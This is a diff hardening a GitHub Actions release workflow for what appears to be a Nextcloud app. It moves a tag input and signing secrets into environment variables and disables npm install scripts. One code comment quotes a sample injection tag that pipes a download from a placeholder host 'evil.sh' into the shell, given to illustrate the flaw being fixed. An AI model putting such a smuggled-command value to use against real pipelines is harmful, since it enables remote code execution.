@@ -23,9 +23,14 @@ jobs:
     steps:
       - name: Resolve tag
         id: resolve
+        # INPUT_TAG is caller-controlled, so it goes through the environment
+        # rather than being interpolated into the script body, where a tag like
+        # `v1"; curl evil.sh | sh; #` would execute (githubactions:S7630).
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
-          if [ -n "${{ inputs.tag }}" ]; then
-            TAG="${{ inputs.tag }}"
+          if [ -n "$INPUT_TAG" ]; then
+            TAG="$INPUT_TAG"
           else
             TAG="${GITHUB_REF#refs/tags/}"
           fi
@@ -74,14 +79,20 @@ jobs:
       - name: Install dependencies and build
         run: |
           composer install --no-dev --optimize-autoloader
-          npm ci
+          npm ci --ignore-scripts
           npm run build
 
+      # The key/cert reach the script through the environment rather than being
+      # expanded into the `run:` body, where they would end up in the rendered
+      # command line (githubactions:S7636).
       - name: Setup signing certificate
+        env:
+          APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
+          APP_PUBLIC_CRT: ${{ secrets.APP_PUBLIC_CRT }}
         run: |
-          mkdir -p $HOME/.nextcloud/certificates
-          echo "${{ secrets.APP_PRIVATE_KEY }}" > $HOME/.nextcloud/certificates/${{ env.APP_NAME }}.key
-          echo "${{ secrets.APP_PUBLIC_CRT }}" > $HOME/.nextcloud/certificates/${{ env.APP_NAME }}.crt
+          mkdir -p "$HOME/.nextcloud/certificates"
+          printf '%s\n' "$APP_PRIVATE_KEY" > "$HOME/.nextcloud/certificates/${APP_NAME}.key"
+          printf '%s\n' "$APP_PUBLIC_CRT" > "$HOME/.nextcloud/certificates/${APP_NAME}.crt"
 
       - name: Extract changelog for this version
         id: changelog
